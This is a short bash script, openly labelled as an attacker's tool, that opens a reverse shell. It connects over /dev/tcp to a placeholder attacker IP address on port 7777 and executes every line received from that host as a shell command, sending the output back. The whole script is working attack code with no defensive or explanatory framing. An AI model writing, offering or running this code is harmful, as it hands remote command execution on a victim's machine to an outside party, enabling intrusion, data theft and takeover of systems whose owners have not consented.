#!/bin/bash

# Variables
REMOTE_HOST="attacker_ip_address"  # Replace with the attacker's IP address
REMOTE_PORT=7777                   # Replace with the desired port number

# Create a reverse shell using /dev/tcp
exec 5<>/dev/tcp/$REMOTE_HOST/$REMOTE_PORT
while read line <&5; do
  $line 2>&5 >&5
done
